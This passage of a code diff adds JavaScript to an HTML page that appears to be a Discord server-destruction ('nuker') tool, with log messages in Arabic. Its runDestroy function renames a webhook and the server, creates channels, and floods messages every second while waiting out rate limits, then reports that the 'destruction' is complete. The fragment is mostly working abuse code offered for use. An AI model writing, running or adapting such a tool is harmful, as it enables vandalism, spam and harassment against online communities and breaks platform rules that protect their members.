+                        await new Promise(r => setTimeout(r, retryAfter * 1000));
+                    } else {
+                        logMessage(`❌ فشل الإرسال: ${response.status}`);
+                    }
+                } catch (e) {
+                    logMessage(`❌ خطأ في الإرسال: ${e.message}`);
+                }
+            }
+
+            async function runDestroy() {
+                try {
+                    await updateWebhookName();
+                    await renameServer();
+                    await createChannel();
+                    await createChannel();
+                    await createChannel();
+
+                    logMessage('🔥 بدء إرسال الرسائل المتتالية...');
+
+                    const interval = setInterval(async () => {
+                        if (attempts >= maxAttempts) {
+                            clearInterval(interval);
+                            logMessage('✅ اكتملت عملية التدمير بنجاح!');
+                            isDestroying = false;
+                            return;
+                        }
+                        await sendSpam();
+                    }, 1000);
+
+                } catch (e) {
+                    logMessage(`❌ خطأ فادح: ${e.message}`);
+                    isDestroying = false;
+                }
+            }
+
+            runDestroy();
+        }
+
+        function copyOutput() {
+            const output = document.getElementById('outputArea');
+            if (!output.value.trim()) return;
+            output.select();
+            output.setSelectionRange(0, 99999);
+            document.execCommand('copy');
+        }
+    </script>
 </body>
 </html>
